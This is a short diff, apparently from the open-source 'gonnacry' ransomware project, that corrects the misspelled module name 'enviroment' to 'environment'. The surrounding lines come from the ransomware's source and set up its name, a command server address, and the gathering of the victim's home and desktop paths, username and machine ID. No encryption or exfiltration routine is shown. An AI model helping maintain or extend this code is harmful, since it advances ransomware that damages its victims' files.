@@ -1,4 +1,4 @@
-import enviroment
+import environment
 import symmetric
 import utils
 
@@ -37,14 +37,14 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
                                                  '\33[93m', '\033[1;35m', '\033[1;32m', \
                                                   '\033[0m'
 
-# enviroment paths
+# environment paths
 ransomware_name = ("gonnacry")
 server_address = ("http://localhost:8000")
-home = enviroment.get_home_path()
-desktop = enviroment.get_desktop_path()
-username = enviroment.get_username()
+home = environment.get_home_path()
+desktop = environment.get_desktop_path()
+username = environment.get_username()
 ransomware_path = os.path.join(home, ransomware_name)
-machine_id = enviroment.get_unique_machine_id()
+machine_id = environment.get_unique_machine_id()
 
 
 def kill_daemon():
